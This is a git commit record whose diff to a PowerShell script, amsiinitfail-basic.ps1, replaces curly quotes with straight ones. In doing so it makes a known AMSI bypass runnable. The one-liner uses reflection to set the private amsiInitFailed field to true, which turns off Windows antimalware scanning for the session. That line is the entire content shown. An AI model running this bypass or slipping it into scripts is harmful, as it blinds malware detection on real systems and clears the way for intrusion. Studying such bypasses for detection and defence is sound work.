fe3565a055534f6d3a0636a0a5b7e8e1651ce4d1
74l4r14 <98590947+74l4r14@users.noreply.github.com>
2025-11-11 20:08:39 +0000

    Update amsiinitfail-basic.ps1

--- amsiinitfail-basic.ps1
+++ amsiinitfail-basic.ps1
@@ -1,1 +1,1 @@
-[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
